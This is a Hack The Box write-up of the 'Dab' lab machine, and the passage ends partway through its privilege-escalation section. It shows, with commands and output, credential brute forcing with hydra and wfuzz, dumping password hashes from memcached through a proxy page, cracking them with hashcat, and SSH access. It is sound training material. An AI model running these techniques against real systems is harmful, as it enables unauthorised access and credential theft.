---
title: HTB: Dab
url: https://0xdf.gitlab.io/2019/02/02/htb-dab.html
date: 2019-02-02T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, htb-dab, hackthebox, flask, python, nginx, wsgi, memcached, bruteforce, hydra, wfuzz, hashcat, ssh, ldd, ldconfig, reverse-engineering, ida
---

![](https://0xdfimages.gitlab.io/img/dab-cover.png)Dab had some really neat elements, with a few trolls thrown in. I’ll start by ignoring a steg troll in an open FTP and looking at two web apps. As I’m able to brute force my way into one, it populates a memcached instance, that I’m then able to query using the other as a proxy. From that instance, I’m able to dump users with md5 password hashes. After cracking twelve of them, one gives me ssh access to the box. From there, I’ll take advantage of my having root level access to the tool that configures how dynamic run-time linking occurs, and use that to pivot to a root shell. In Beyond Root, I’ll look at the web apps and how they are configured, one of the troll binaries, and a cleanup cron job I found but managed to avoid by accident.

## Box Info

| Name | [Dab](https://hackthebox.com/machines/dab)  [Dab](https://hackthebox.com/machines/dab) [Play on HackTheBox](https://hackthebox.com/machines/dab) |
| --- | --- |
| Release Date | [14 Jul 2018](https://twitter.com/hackthebox_eu/status/1030007397778157569) |
| Retire Date | 02 Feb 2019 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Dab |
| Radar Graph | Radar chart for Dab |
| First Blood User | 00:49:46[Adamm Adamm](https://app.hackthebox.com/users/2571) |
| First Blood Root | 02:27:55[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| Creator | [snowscan snowscan](https://app.hackthebox.com/users/9267) |

## Recon

### nmap

`nmap` gives me four ports to look at, ftp, ssh, and two http servers:

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.86
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-29 05:49 EDT
Nmap scan report for 10.10.10.86
Host is up (0.083s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds

root@kali# nmap -sV -sC -p 21,22,80,8080 -oA nmap/scripts 10.10.10.86
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-29 05:50 EDT
Nmap scan report for 10.10.10.86
Host is up (0.024s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            8803 Mar 26  2018 dab.jpg
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:05:77:1e:73:66:bb:1e:7d:46:0f:65:50:2c:f9:0e (RSA)
|   256 61:ae:15:23:fc:bc:bc:29:13:06:f2:10:e0:0e:da:a0 (ECDSA)
|_  256 2d:35:96:4c:5e:dd:5c:c0:63:f0:dc:86:f1:b1:76:b5 (ED25519)
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
| http-title: Login
|_Requested resource was http://10.10.10.86/login
8080/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Internal Dev
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.68 seconds

root@kali# nmap -sU -p- --min-rate 5000 -oA nmap/alludp 10.10.10.86
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-29 05:49 EDT
Warning: 10.10.10.86 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.86
Host is up (0.047s latency).
All 65535 scanned ports on 10.10.10.86 are open|filtered (65385) or closed (150)

Nmap done: 1 IP address (1 host up) scanned in 145.25 seconds

```

### FTP - TCP 21

With anonymous FTP access, that’s an obvious first place to check. There’s only a single file, an image:

```

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            8803 Mar 26  2018 dab.jpg
226 Directory send OK.

```

![](https://0xdfimages.gitlab.io/img/dab.jpg)

In playing around with the image, I tried `steghide`, a common steg tool, and with a blank password, it worked:

```

root@kali# steghide extract -sf dab.jpg 
Enter passphrase: 
wrote extracted data to "dab.txt".

root@kali# cat dab.txt 
Nope...

```

So that’s just a troll.

### HTTP - TCP 80

#### Site

The site presents me with a login page:

![1548769080159](https://0xdfimages.gitlab.io/img/1548769080159.png)

#### gobuster

Before playing with the site manually, I’ll start a `gobuster` to enumerate in the background. In this case, I find two paths, which I’ll be able to see exploring manually as well:

```

root@kali# gobuster -u http://10.10.10.86 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 20 -x txt,php

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.86/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.php
=====================================================
/login (Status: 200)
/logout (Status: 302)
=====================================================

```

#### Identify Usernames

On testing a few logins, I’ll notice there’s a subtle difference between a failed login with user “admin” (that likely exists) and user “asdasdasd” (that likely does not):

![1540810145333](https://0xdfimages.gitlab.io/img/1540810145333.png)

vs 

![1540810168467](https://0xdfimages.gitlab.io/img/1540810168467.png)

I can use this to brute force usernames. I’ll pick a password that won’t work. Now if it returns with no trailing “.”, that means the username exists. If it has the “.”, the user does not exist.

`hydra` wants a string to recognize failure. In this case, I’ll give it the string with the “.” as that means the username doesn’t exist, and it will then show me the ones where the username does exist.

```

root@kali# hydra -L /opt/SecLists/Usernames/cirt-default-usernames.txt -p sadfasdfasdf 10.10.10.86 http-post-form "/login:username=^USER^&password=^PASS^&submit=Login:Login failed.<"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-29 06:38:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 825 login tries (l:825/p:1), ~52 tries per task
[DATA] attacking http-post-form://10.10.10.86:80//login:username=^USER^&password=^PASS^&submit=Login:Login failed.<
[80][http-post-form] host: 10.10.10.86   login: ADMIN   password: sadfasdfasdf
[80][http-post-form] host: 10.10.10.86   login: Admin   password: sadfasdfasdf
[80][http-post-form] host: 10.10.10.86   login: Audrey   password: sadfasdfasdf
[80][http-post-form] host: 10.10.10.86   login: DEFAULT   password: sadfasdfasdf
[80][http-post-form] host: 10.10.10.86   login: DEMO   password: sadfasdfasdf
[80][http-post-form] host: 10.10.10.86   login: Demo   password: sadfasdfasdf
[80][http-post-form] host: 10.10.10.86   login: admin   password: sadfasdfasdf
[80][http-post-form] host: 10.10.10.86   login: default   password: sadfasdfasdf
[80][http-post-form] host: 10.10.10.86   login: demo   password: sadfasdfasdf
1 of 1 target successfully completed, 9 valid passwords found

```

Again, because I told `hydra` that failure was the string “Login failed.”, it’s reporting any time it doesn’t get that, which are valid usernames.

#### Brute Force Password

With a small list of usernames, now I’ll try for a password. rockyou is huge, and there’s no way I’ll get all the way through it, but it’s a good place to start to see if anything jumps out and to let run in the background. It finds a login for admin very quickly:

```

root@kali# hydra -L usernames -P /usr/share/wordlists/rockyou.txt 10.10.10.86  http-post-form "/login:username=^USER^&password=^PASS^&submit=Login:failed"                        
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-29 06:55:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 57377596 login tries (l:4/p:14344399), ~3586100 tries per task
[DATA] attacking http-post-form://10.10.10.86:80//login:username=^USER^&password=^PASS^&submit=Login:failed
[STATUS] 1569.00 tries/min, 1569 tries in 00:01h, 57376027 to do in 609:29h, 16 active
[80][http-post-form] host: 10.10.10.86   login: admin   password: Password1

```

#### Logged In Site

On logging in, I get a page that lists items in stock:

![1548770704407](https://0xdfimages.gitlab.io/img/1548770704407.png)

At this point, this looks like a dead end. However, accessing this page, and attempting to login, initiated something behind the scenes with memcache. I’ll talk more about that when I get to it.

### HTTP - TCP 8080

At this point I’ll continue with port 8080.

#### Site

On visiting the site, I get back a message that my access is denied:

> Access denied: password authentication cookie not set

#### Fuzz Cookie

First, I need to figure out what the cookie is called. I’ll use `wfuzz`, and notice that when I run it without any filters, everything returns 322 characters. So I’ll include the `--hh 322` to hide those responses. In doing so, I find a potential cookie name, password:

```

root@kali# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: FUZZ" --hh 322 http://10.10.10.86:8080
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.86:8080/
Total requests: 2588

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000005:  C=200     14 L       29 W          324 Ch        "password"

Total time: 6.539661
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 395.7391

```

I’ll jump over to burp, find a GET on `/`, and send it to repeater. I’ll add a cookie with password and an arbitrary value:

```

GET / HTTP/1.1
Host: 10.10.10.86:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: password=0xdf
Upgrade-Insecure-Requests: 1

```

The response back has a new error message:

> Access denied: password authentication cookie incorrect

So I’ve found the cookie name. Now I need to try to find the value. I’ll use `wfuzz` again, this time hiding 324 character responses with `--hh 324`, since that’s the error message when the cookie is incorrect. This reveals that the password is “secret”:

```

root@kali# wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -H "Cookie: password=FUZZ" --hh 324 http://10.10.10.86:8080
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.86:8080/
Total requests: 10000

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000097:  C=200     21 L       48 W          540 Ch        "secret"

Total time: 25.02369
Processed Requests: 10000
Filtered Requests: 9999
Requests/sec.: 399.6212

```

#### Site

Once I set the cookie `password=secret`, I get a site with a form offering a TCP socket test:

![1540819678302](https://0xdfimages.gitlab.io/img/1540819678302.png)

On entering values, it submits a GET to `/socket?port=[TCP port]&cmd=[Line to send...]`.

I’ll use `curl` to poke at this a bit. First, I’ll play with the port parameter. If I put in port 1, I get back an Internal Server Error 500. But if I put in 21, I get back errors from an FTP server:

```

root@kali# curl -H "Cookie: password=secret" 'http://10.10.10.86:8080/socket?port=1&cmd=0xdf'
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>                                  

root@kali# curl -H "Cookie: password=secret" 'http://10.10.10.86:8080/socket?port=21&cmd=0xdf'
<!DOCTYPE html>
<html lang="en">
<head>
<title>Internal Dev</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width">                                                                                     
</head>
<body>
<div class="container wrapper">

<p>Status of cache engine: Online</p>
<h4>TCP socket test</h4>
<form action="/socket">
<input type="text" name="port" placeholder="TCP port"></input>
<input type="text" name="cmd" placeholder="Line to send..."></input>
<input type="submit" value="Submit"</input>
</form>

<p>Output</p>
<pre>
220 (vsFTPd 3.0.3)
530 Please login with USER and PASS.

</pre>

</div>
</body>
</html>

```

Similarly, port 22 and 80 return errors about ssh and http:

```

root@kali# curl -H "Cookie: password=secret" 'http://10.10.10.86:8080/socket?port=22&cmd=0xdf'
...[snip]...
<p>Output</p>
<pre>
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
Protocol mismatch.

</pre>
...[snip]...

root@kali# curl -H "Cookie: password=secret" 'http://10.10.10.86:8080/socket?port=80&cmd=0xdf'
...[snip]...
<p>Output</p>
<pre>
HTTP/1.1 400 Bad Request
Server: nginx/1.10.3 (Ubuntu)
Date: Tue, 29 Jan 2019 14:25:16 GMT
Content-Type: text/html
Content-Length: 182
Connection: close

&lt;html&gt;
&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
&lt;body bgcolor=&#34;white&#34;&gt;
&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.10.3 (Ubuntu)&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;

</pre>
...[snip]...

```

This form seems to be proxying tcp connections. I’ll use `wfuzz` again, this time to look for what ports are open. I’ll filter out responses that are 500:

```

root@kali# wfuzz -c -z range,1-65535 -u 'http://10.10.10.86:8080/socket?port=FUZZ&cmd=abc' -H "Cookie: password=secret" --hc=500
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.86:8080/socket?port=FUZZ&cmd=abc
Total requests: 65535

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000021:  C=200     28 L       61 W          627 Ch        "21"
000022:  C=200     28 L       55 W          629 Ch        "22"
000080:  C=200     40 L       84 W         1010 Ch        "80"
008080:  C=200     40 L       84 W         1010 Ch        "8080"
011211:  C=200     27 L       52 W          576 Ch        "11211"

Total time: 817.6226
Processed Requests: 65535
Filtered Requests: 65529
Requests/sec.: 80.15311

```

At this point, I’ll hypothesize that the connections are being proxied to localhost, as the same 4 ports are open, and that something is running on 11211 that is only listening on localhost or there’s a firewall preventing me from interacting with it directly.

### memcached - TCP 11211

#### Background

memcached [describes itself as](https://memcached.org/):

> **Free & open source, high-performance, distributed memory object caching system**, generic in nature, but intended for use in speeding up dynamic web applications by alleviating database load.
>
> Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering.
>
> **Memcached is simple yet powerful**. Its simple design promotes quick deployment, ease of development, and solves many problems facing large data caches. Its API is available for most popular languages.

It caches data and makes it quickly available so that an application doesn’t have to re-query a database over and over again.

I’ll also make use of this [memcached cheat sheet](https://lzone.de/cheat-sheet/memcached) to for most of the commands I’ll run.

#### Get Version

I will have to interact with this port through the port 8080 website. Still, I can run commands. I’ll start by getting the version:

```

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=version' -H "Cookie: password=secret"
<!DOCTYPE html>
<html lang="en">
<head>
<title>Internal Dev</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width">
</head>
<body>
<div class="container wrapper">

<p>Status of cache engine: Online</p>
<h4>TCP socket test</h4>
<form action="/socket">
<input type="text" name="port" placeholder="TCP port"></input>
<input type="text" name="cmd" placeholder="Line to send..."></input>
<input type="submit" value="Submit"</input>
</form>

<p>Output</p>
<pre>
VERSION 1.4.25 Ubuntu

</pre>

</div>
</body>
</html>

```

Based on [Ubuntu’s packaging site](https://launchpad.net/ubuntu/+source/memcached/1.4.25-2ubuntu1.4), I’m likely dealing with an Ubuntu Xenial host.

I’ll also note that the output I really care about is between the `<pre>` and `</pre>` tags. With `curl`, I’ll pipe my output into `sed -n '/pre/{:a;n;/pre/b;p;ba}'`, which will give me just everything between the `pre` tags.

```

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=version' -H "Cookie: password=secret" | sed -n '/pre/{:a;n;/pre/b;p;ba}'
VERSION 1.4.25 Ubuntu

```

#### Get Item / Slab Info

Next I’ll get information about the items and memory (known as slabs). If I run this without first visiting the port 80 page, or after that information has timed out, I’ll get back nothing:

```

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=stats slabs' -H "Cookie: password=secret" | sed -n '/pre/{:a;n;/pre/b;p;ba}'
STAT active_slabs 0
STAT total_malloced 0
END

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=stats items' -H "Cookie: password=secret" | sed -n '/pre/{:a;n;/pre/b;p;ba}'
END

```

That’s because the cache has timed out and emptied. If I visit the port 80 site and login as admin, and run these same queries again:

```

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=stats slabs' -H "Cookie: password=secret" | sed -n '/pre/{:a;n;/pre/b;p;ba}'
STAT 16:chunk_size 2904
STAT 16:chunks_per_page 361
STAT 16:total_pages 1
STAT 16:total_chunks 361
STAT 16:used_chunks 1
STAT 16:free_chunks 360
STAT 16:free_chunks_end 0
STAT 16:mem_requested 2880
STAT 16:get_hits 0
STAT 16:cmd_set 1
STAT 16:delete_hits 0
STAT 16:incr_hits 0
STAT 16:decr_hits 0
STAT 16:cas_hits 0
STAT 16:cas_badval 0
STAT 16:touch_hits 0
STAT 26:chunk_size 27120
STAT 26:chunks_per_page 38
STAT 26:total_pages 1
STAT 26:total_chunks 38
STAT 26:used_chunks 1
STAT 26:free_chunks 37
STAT 26:free_chunks_end 0
STAT 26:mem_requested 24699
STAT 26:get_hits 0
STAT 26:cmd_set 1
STAT 26:delete_hits 0
STAT 26:incr_hits 0
STAT 26:decr_hits 0
STAT 26:cas_hits 0
STAT 26:cas_badval 0
STAT 26:touch_hits 0
STAT active_slabs 2
STAT total_malloced 2078904
END

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=stats items' -H "Cookie: password=secret" | sed -n '/pre/{:a;n;/pre/b;p;ba}'
STAT items:16:number 1
STAT items:16:age 11
STAT items:16:evicted 0
STAT items:16:evicted_nonzero 0
STAT items:16:evicted_time 0
STAT items:16:outofmemory 0
STAT items:16:tailrepairs 0
STAT items:16:reclaimed 0
STAT items:16:expired_unfetched 0
STAT items:16:evicted_unfetched 0
STAT items:16:crawler_reclaimed 0
STAT items:16:crawler_items_checked 0
STAT items:16:lrutail_reflocked 0
STAT items:26:number 1
STAT items:26:age 11
STAT items:26:evicted 0
STAT items:26:evicted_nonzero 0
STAT items:26:evicted_time 0
STAT items:26:outofmemory 0
STAT items:26:tailrepairs 0
STAT items:26:reclaimed 0
STAT items:26:expired_unfetched 0
STAT items:26:evicted_unfetched 0
STAT items:26:crawler_reclaimed 0
STAT items:26:crawler_items_checked 0
STAT items:26:lrutail_reflocked 0
END

```

#### Get Item Names for Each Slab

Looking at the output from `stats items` and `stats slabs`, I’ll notice that each shows two slab ids: 16 and 26. You can think of these almost like tables in a database. Each slab is a different group of cached data.

For each slab, I’ll use the `stats cachedump` command (which is actually an [undocumented feature](https://blog.elijaa.org/2010/12/24/understanding-memcached-stats-cachedump-command/)). It will give me each item in the slab, with its size and expiration timestamp:

```

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=stats cachedump 16 0' -H "Cookie: password=secret" | sed -n '/pre/{:a;n;/pre/b;p;ba}'                         
ITEM stock [2807 b; 1540823371 s]
END

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=stats cachedump 26 0' -H "Cookie: password=secret" | sed -n '/pre/{:a;n;/pre/b;p;ba}'
ITEM users [24625 b; 1540811452 s]
END

```

#### Get Users Data

Now I can get the actual data. The `stock` item returns json data that matches what I see on the port 80 page. The users item contains usernames and hashes. To display this properly, I’ll use `recode` to un-html encode a bunch of stuff, and then a similar to before `sed` command:

```

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=get users' -H "Cookie: password=secret" | recode html..ascii | sed -n '/<pre>/{:a;n;/<\/pre/b;p;ba}'
VALUE users 0 24625
{"quinton_dach": "17906b445a05dc42f78ae86a92a57bbd", "jackie.abbott": "c6ab361604c4691f78958d6289910d21", "isidro": "e4a4c90483d2ef61de42af1f044087f3", "roy": "afbde995441e19497fe0695e9c539266", "colleen": "d3792794c3143f7e04fd57dc8b085cd4", "harrison.hessel": "bc5f9b43a0336253ff947a4f8dbdb74f", "asa.christiansen": "d7505316e9a10f
c113126f808663b5a4", "jessie": "71f08b45555acc5259bcefa3af63f4e1", "milton_hintz": "8f61be2ebfc66a5f2496bbf849c89b84", "demario_homenick": "2c22da161f085a9aba62b9bbedbd4ca7", "paris": "ef9b20082b7c234c91e165c947f10b71", "gardner_ward": "eb7ed0e8c112234ab1439726a4c50162", "daija.casper": "4d0ed472e5714e5cca8ea7272b15173a", "alanna.
prohaska": "6980ba8ee392b3fa6a054226b7d8dd8f", "russell_borer": "cb10b94b5dbb5dfab049070a2abda16e", "domenica.kulas": "5cb322691472f05130416b05b22d4cdf", "davon.kuhic": "e301e431db395ab3fdc123ba8be93ff9", "alana": "41c85abbc7c64d93ca7bda5e2cfc46c2", "bryana": "4d0da0f96ecd0e8b655573cd67b8a1c1", "elmo_welch": "89122bf3ade23faf37b470f1fa5c7358", ...[snip]...
END

```

If I update the `sed` slightly to get values between the line with `VALUE` and `END`, I can get just the json, and I can use `jq` to format it:

```

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=get users' -H "Cookie: password=secret" | recode html..ascii | sed -n '/VALUE/{:a;n;/END/b;p;ba}' | jq .
{
  "quinton_dach": "17906b445a05dc42f78ae86a92a57bbd",
  "jackie.abbott": "c6ab361604c4691f78958d6289910d21",
  "isidro": "e4a4c90483d2ef61de42af1f044087f3",
  "roy": "afbde995441e19497fe0695e9c539266",
  "colleen": "d3792794c3143f7e04fd57dc8b085cd4",
  "harrison.hessel": "bc5f9b43a0336253ff947a4f8dbdb74f",
  "asa.christiansen": "d7505316e9a10fc113126f808663b5a4",
  "jessie": "71f08b45555acc5259bcefa3af63f4e1",
  "milton_hintz": "8f61be2ebfc66a5f2496bbf849c89b84",
...[snip]...

```

I’ll notice that if I wait even a minute or so, the users table goes empty. Logging out and back into the port 80 site refreshed it. I’ll save this json to a file to not have to worry about that anymore.

```

root@kali# curl -s 'http://10.10.10.86:8080/socket?port=11211&cmd=get users' -H "Cookie: password=secret" | recode html..ascii | sed -n '/VALUE/{:a;n;/END/b;p;ba}' | jq . > users.json

```

#### Get Hashes for hashcat

I’ll make a file of hashes to send to `hashcat` using jq. Right now, I want all of the values, regardless of the key. To do this, I’ll make use of the `jq` function `to_entries`.

I’ll use some example data as a test, an object with two keys, “foo” and “baz”:

```

root@kali# echo '{"foo": "bar", "baz": "buzz"}' | jq .
{
  "foo": "bar",
  "baz": "buzz"
}

```

If I send that into `to_entries`, it will create an array, where each item has a `key` and a `value`:

```

root@kali# echo '{"foo": "bar", "baz": "buzz"}' | jq 'to_entries'
[
  {
    "key": "foo",
    "value": "bar"
  },
  {
    "key": "baz",
    "value": "buzz"
  }
]

```

If I want just the values, I can get them:

```

root@kali# echo '{"foo": "bar", "baz": "buzz"}' | jq 'to_entries | .[].value'
"bar"
"buzz"

```

I can take the same approach to get the hashes:

```

root@kali# cat users.json | jq -r 'to_entries | .[].value'
17906b445a05dc42f78ae86a92a57bbd
c6ab361604c4691f78958d6289910d21
e4a4c90483d2ef61de42af1f044087f3
afbde995441e19497fe0695e9c539266
d3792794c3143f7e04fd57dc8b085cd4
bc5f9b43a0336253ff947a4f8dbdb74f
d7505316e9a10fc113126f808663b5a4
71f08b45555acc5259bcefa3af63f4e1
8f61be2ebfc66a5f2496bbf849c89b84
2c22da161f085a9aba62b9bbedbd4ca7
...[snip]...

```

#### Crack Hashes

These are simple md5 hashes, and 12 crack with `hashcat` and rockyou:

```

$ hashcat -a 0 -m 0 users-hashes /usr/share/wordlists/rockyou.txt --force -o cracked
$ hashcat users-hashes --show
eb95fc1ab8251cf1f8f870e7e4dae54d:megadeth
fc7992e8952a8ff5000cb7856d8586d2:Princess1
fe01ce2a7fbac8fafaed7c982a04e229:demo
2ac9cb7dc02b3c0083eb70898e549b63:Password1
254e5f2c3beb1a3d03f17253c15c07f3:hacktheplanet
c21f969b5f03d33d43e04f8f136e7682:default
9731e89f01c1fb943cf0baa6772d2875:piggy
0ef9c986fad340989647f0001e3555d4:misfits
5177790ad6df0ea98db41b37b602367c:strength
6f9ff93a26a118b460c878dc30e17130:monkeyman
1e0ad2ec7e8c3cc595a9ec2e3762b117:blaster
0daa6275280be3cf03f9f9c62f9d26d1:lovesucks1

```

## Shell as genevieve

### Organize Usernames / Passwords

Now that I have 12 accounts and passwords, I’ll check if any can be used to SSH into Dab. 12 is few enough that I could probably just try them by hand. Still, it’s more fun to automate it a bit.

I’ve got a file with `hash:password`, and another file with json `"username": "hash"`. I want to have a file with `username:password` so I can run it into `hydra`. I’ll loop over the hash/password combinations and then use grep to find the username.

```

root@kali# cat cracked | while read c; do hash=$(echo ${c} | cut -d: -f1); pass=$(echo $c | cut -d: -f2); username=$(grep ${hash} users | cut -d: -f1); echo "${username}:${pass}"; done > user_pass

root@kali# cat user_pass
wendell:megadeth
genevieve:Princess1
demo:demo
admin:Password1
d_murphy:hacktheplanet
default:default
abbigail:piggy
aglae:misfits
irma:strength
ona:monkeyman
alec:blaster
rick:lovesucks1

```

I’ll break that loop down:
1. `cat cracked | while read c; do` - Start a loop over each line in my cracked output. An example line looks like `254e5f2c3beb1a3d03f17253c15c07f3:hacktheplanet`.
2. `hash=$(echo ${c} | cut -d: -f1);` - Use `cut` to get just the hash part of the line, and save it as `hash.`
3. `pass=$(echo $c | cut -d: -f2);` - Do the same to save the password as `pass`.
4. `username=$(grep ${hash} users.json | cut -d'"' -f2);` - `grep` to find the line with the corresponding hash in the users.json file. The line will look like `"colleen": "d3792794c3143f7e04fd57dc8b085cd4",`. Then cut based on `"` and get the 2nd field, which is the username. Save that as `username`.
5. `echo "${username}:${pass}";` - Echo the username and password in the desired format.

### Hydra

Now I can use `hydra` to see if any of the 12 work as an SSH login, using the `-C` flag, which takes a colon separated “login:pass” format, rather than the `-L` and `-P` options. It finds I can successfully ssh as genevieve:

```

root@kali# hydra -C user_pass ssh://10.10.10.86
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                                                                

Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-29 11:58:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4                                                                                          
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task
[DATA] attacking ssh://10.10.10.86:22/
[22][ssh] host: 10.10.10.86   login: genevieve   password: Princess1
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-29 11:58:17

```

### ssh Shell

I am now able to ssh in as genevieve:

```

root@kali# ssh genevieve@10.10.10.86
The authenticity of host '10.10.10.86 (10.10.10.86)' can't be established.
ECDSA key fingerprint is SHA256:3gHAJvc1zomI4M6+oCp/3xrMyS6DMPbMFEGDbBO2Qso.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.86' (ECDSA) to the list of known hosts.
genevieve@10.10.10.86's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-133-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Mar 26 23:42:41 2018 from 172.23.10.99

genevieve@dab:~$ pwd
/home/genevieve

```

From here, I’ll grab user.txt:

```

genevieve@dab:~$ cat user.txt 
9bcd2cbb...

```

## Privesc: genevieve –> root

### Enumeration

Looking over the box, two things stuck out as interesting, and both were binaries with the setuid bit enabled to run as root:

```

genevieve@dab:/$ ls -l /sbin/ldconfig
-rwsr-sr-x 1 root root 387 Jan 14  2018 /sbin/ldconfig

genevieve@dab:/$ ls -l /usr/bin/myexec 
-rwsr-sr-x 1 root root 8864 Mar 25  2018 /usr/bin/myexec

```

`ldconfig` is used to configure dynamic linker run-time bindings. `myexec` is not a binary I’m familiar with.

### myexec

#### Run It

I’ll explore `myexec` first. Running it asks for a password, and then exits I give it the wrong password:

```

genevieve@dab:/$ myexec 
Enter password: 0xdf
Invalid password

```

#### Find Password

I’ll open it up in Ida Pro (free version) and see if I can figure out what the password should be. The main function is quite simple. I’ve labeled the important bits:

![1548780937988](https://0xdfimages.gitlab.io/img/1548780937988.png)

So it looks like the password is “s3cur3l0g1n”. Another way to see this is to run the program in `gdb`. I’ll open it with `gdb myexec` (my gdb is also configured to load [peda](https://github.com/longld/peda)) . Then, I’ll run `disassemble main` and look for that call to `strcmp`:

```

gdb-peda$ disassemble main
...[snip]...
   0x0000000000400895 <+95>:    call   0x400710 <strcmp@plt>
...[snip]...
End of assembler dump.

```

Now I’ll put a break at that location, and run. When prompted, I’ll enter a throw away password:

```

gdb-peda$ b *main+95
Breakpoint 1 at 0x400895
gdb-peda$ r
Starting program: /media/sf_CTFs/hackthebox/dab-10.10.10.86/loot/myexec
Enter password: 0xdf
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdf60 ("s3cur3l0g1n")
RBX: 0x0
RCX: 0x602675 --> 0x0
RDX: 0x7fffffffdf70 --> 0x66647830 ('0xdf')
RSI: 0x7fffffffdf70 --> 0x66647830 ('0xdf')
RDI: 0x7fffffffdf60 ("s3cur3l0g1n")
RBP: 0x7fffffffdfc0 --> 0x4008f0 (<__libc_csu_init>:    push   r15)
RSP: 0x7fffffffdf50 --> 0x0
